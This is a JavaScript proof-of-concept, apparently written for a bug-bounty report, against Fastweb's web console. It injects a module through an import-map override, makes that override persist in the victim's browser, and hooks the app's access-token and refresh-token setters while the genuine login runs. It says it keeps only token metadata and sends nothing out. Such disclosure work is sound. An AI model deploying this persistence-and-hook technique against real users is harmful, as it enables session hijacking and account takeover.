/*
 * FW-08 safe token-path validator - AUTHORISED BUG BOUNTY TESTING ONLY.
 *
 * Loaded in place of @fastweb-tmt/root-config through the FW-08 import-map
 * override. It hooks the shared currentUser object, then boots Fastweb's real
 * root configuration so the console behaves normally.
 *
 * It never shows, stores, logs or sends a token. For each token it records only
 * four harmless facts: that one arrived, its length, how many dot-separated
 * segments it has, and a six-byte SHA-256 prefix computed locally.
 *
 * The only network activity is two System.import() calls for Fastweb's own
 * modules on bricks.fastweb.it. It contacts no attacker-controlled server.
 */
(function () {
  "use strict";

  // Persist the exact URL this module was loaded from, so a later visit reloads
  // the same pinned commit rather than a moving branch alias.
  var SELF = (function () {
    try {
      var cs = document.currentScript;
      if (cs && cs.src && cs.src.indexOf("fw08-token-hook-safe.js") !== -1) return cs.src;
    } catch (error) {}
    return "https://cdn.jsdelivr.net/gh/89p1rPWN/fw08-poc@main/fw08-token-hook-safe.js";
  })();
  var REAL_ROOT = "https://bricks.fastweb.it//fe-app-shell/fastweb-tmt-root-config.js";

  var state = window.__FW08_TOKEN_PROOF__ = {
    marker: "fw08-token-hook-safe",
    moduleUrl: SELF,
    origin: location.origin,
    onFastwebOrigin: location.origin === "https://bricks.fastweb.it",
    overridePersisted: false,
    utilityLoaded: false,
    settersReplaced: false,
    genuineRootStarted: false,
    accessTokenObserved: false,
    refreshTokenObserved: false
  };

  function line(ok, label, detail) {
    return (ok ? "  [X]  " : "  [ ]  ") + label +
      (detail ? "\n         " + detail : "");
  }

  function render() {
    var box = document.getElementById("fw08-token-proof");
    if (!box) {
      box = document.createElement("pre");
      box.id = "fw08-token-proof";
      box.style.cssText = "position:fixed;left:50%;top:50%;transform:translate(-50%,-50%);" +
        "z-index:2147483647;width:780px;max-width:96vw;padding:24px 26px;background:#0d1424;" +
        "color:#e6edf7;border:3px solid #39d98a;border-radius:8px;box-shadow:0 18px 60px rgba(0,0,0,.55);" +
        "font:14px/1.6 ui-monospace,Menlo,Consolas,monospace;white-space:pre-wrap";
      (document.body || document.documentElement).appendChild(box);
    }

    var access = state.accessTokenMetadata;
    var refresh = state.refreshTokenMetadata;

    box.textContent = [
      "FW-08  what the injected module can reach",
      "=========================================",
      "",
      line(state.onFastwebOrigin, "Attacker module is running on Fastweb's own origin",
        state.origin),
      line(state.overridePersisted, "Module made itself permanent for this browser",
        "later visits need no link at all"),
      line(state.utilityLoaded, "Loaded Fastweb's shared user object (@fastweb-tmt/utils)"),
      line(state.settersReplaced, "Replaced setToken() and setRefreshToken() with mine"),
      line(state.genuineRootStarted, "Started Fastweb's real application",
        "you log in on Fastweb's genuine pages, nothing is faked"),
      "",
      "  ACCESS TOKEN CAPTURED :  " +
        (state.accessTokenObserved
          ? "YES  (" + access.length + " chars, " + access.jwtSegments +
            " JWT parts, sha256 " + access.sha256Prefix + ")"
          : "not yet - sign in to complete this line"),
      "  REFRESH TOKEN CAPTURED:  " +
        (state.refreshTokenObserved
          ? "YES  (" + refresh.length + " chars, " + refresh.jwtSegments +
            " JWT parts, sha256 " + refresh.sha256Prefix + ")"
          : "not yet - sign in to complete this line"),
      "",
      "-----------------------------------------",
      "No token value is shown, stored or sent anywhere. The only things",
      "this file loads are Fastweb's own two modules, from bricks.fastweb.it.",
      "It contacts no attacker server. Full object: window.__FW08_TOKEN_PROOF__"
    ].join("\n");
  }

  async function fingerprint(value) {
    var bytes = new TextEncoder().encode(String(value));
    var digest = await crypto.subtle.digest("SHA-256", bytes);
    return Array.from(new Uint8Array(digest)).slice(0, 6)
      .map(function (b) { return b.toString(16).padStart(2, "0"); }).join("");
  }

  async function record(kind, value) {
    if (!value) return;
    var key = kind === "access" ? "accessToken" : "refreshToken";
    state[key + "Observed"] = true;
    state[key + "Metadata"] = {
      length: String(value).length,
      jwtSegments: String(value).split(".").length,
      sha256Prefix: await fingerprint(value)
    };
    render();
  }

  try {
    if (window.importMapOverrides && window.importMapOverrides.addOverride) {
      window.importMapOverrides.addOverride("@fastweb-tmt/root-config", SELF);
      state.overridePersisted = true;
    }
  } catch (error) {
    state.overrideError = String(error);
  }

  render();

  // The real application mounts after this module runs, so keep the panel
  // attached in case the app's own render clears the body.
  var keepAlive = setInterval(function () {
    if (!document.getElementById("fw08-token-proof")) render();
  }, 1000);
  setTimeout(function () { clearInterval(keepAlive); }, 300000);

  System.import("@fastweb-tmt/utils").then(function (utils) {
    var user = utils.currentUser;
    state.utilityLoaded = true;

    var originalSetToken = user.setToken.bind(user);
    var originalSetRefreshToken = user.setRefreshToken.bind(user);

    user.setToken = function (value) {
      originalSetToken(value);
      record("access", value).catch(function () {});
    };
    user.setRefreshToken = function (value) {
      originalSetRefreshToken(value);
      record("refresh", value).catch(function () {});
    };
    state.settersReplaced = true;

    if (user.authToken) record("access", user.authToken).catch(function () {});
    if (user.refreshToken) record("refresh", user.refreshToken).catch(function () {});
    render();

    state.genuineRootStarted = true;
    render();
    return System.import(REAL_ROOT);
  }).catch(function (error) {
    state.error = String(error);
    render();
  });
})();
